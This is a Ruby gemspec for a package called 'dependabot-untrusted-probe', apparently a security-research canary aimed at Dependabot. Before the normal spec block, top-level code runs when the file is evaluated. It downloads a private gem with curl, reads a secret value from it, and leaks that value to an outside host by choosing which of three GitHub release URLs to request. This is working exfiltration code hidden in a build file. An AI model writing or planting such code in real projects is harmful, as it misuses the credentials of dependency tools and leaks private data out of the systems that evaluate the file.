require "fileutils"
require "open3"
require "rubygems/package"
require "tmpdir"

job_id = ENV.fetch("DEPENDABOT_JOB_ID", "unknown")
package_url = "https://rubygems.pkg.github.com/chawdamrunal01/gems/f005-private-canary-0.0.2.gem"
signals = {
  "0" => "https://github.com/Cyber-Buddy/probe-x/releases/download/f005-oracle-v1/f005-private-read-bit-0-20261012.txt",
  "1" => "https://github.com/Cyber-Buddy/probe-x/releases/download/f005-oracle-v1/f005-private-read-bit-1-20261012.txt",
  "no-read" => "https://github.com/Cyber-Buddy/probe-x/releases/download/f005-oracle-v1/f005-private-read-no-read-20261012.txt"
}

signal = "no-read"
package_http_code = "000"

begin
  Dir.mktmpdir("f005-private-read-") do |directory|
    gem_path = File.join(directory, "private.gem")
    stdout, _stderr, status = Open3.capture3(
      "curl", "--location", "--silent", "--show-error", "--max-time", "15",
      "--output", gem_path, "--write-out", "%{http_code}", package_url
    )
    package_http_code = stdout.strip
    if status.success? && package_http_code == "200"
      extract_path = File.join(directory, "extracted")
      FileUtils.mkdir_p(extract_path)
      Gem::Package.new(gem_path).extract_files(extract_path)
      observed = File.read(File.join(extract_path, "data", "secret-bit.txt")).strip
      signal = observed if signals.key?(observed)
    end
  end
rescue StandardError
  signal = "no-read"
end

_stdout, _stderr, signal_status = Open3.capture3(
  "curl", "--location", "--silent", "--show-error", "--max-time", "15",
  "--output", "/dev/null", signals.fetch(signal)
)
warn "F005_PRIVATE_PACKAGE_PROBE job_id=#{job_id} package_http_code=#{package_http_code.inspect} signal_exit=#{signal_status.exitstatus}"

Gem::Specification.new do |spec|
  spec.name = "dependabot-untrusted-probe"
  spec.version = "0.0.1"
  spec.summary = "Owned dependency provenance probe"
  spec.authors = ["chawdamrunal"]
  spec.files = ["lib/dependabot_untrusted_probe.rb"]
  spec.require_paths = ["lib"]
  spec.license = "MIT"
end
